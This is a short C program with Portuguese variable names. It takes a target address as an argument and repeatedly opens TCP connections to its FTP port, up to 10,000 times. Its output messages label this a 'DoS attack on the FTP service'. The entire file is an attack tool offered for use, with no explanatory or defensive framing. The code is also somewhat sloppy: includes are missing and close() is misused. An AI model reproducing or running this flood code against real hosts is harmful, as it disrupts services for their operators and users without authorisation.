#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

        int meu_socket;
        int conecta;
        int i;

        char *destino;
        destino = argv[1];

        int porta;
        porta = 21;

        struct sockaddr_in alvo;

        for (i=1;i<=10000;i++){

        meu_socket = socket(AF_INET,SOCK_STREAM,6); 
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(porta);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conecta = connect(meu_socket, (struct sockaddr *)&alvo, sizeof alvo);

        if(conecta == 0){
                printf("STATUS- Ataque DoS no Serviço FTP na porta %d \n",porta);

        } else {
                close(meu_socket);
                close(conecta);
        }
        }
}

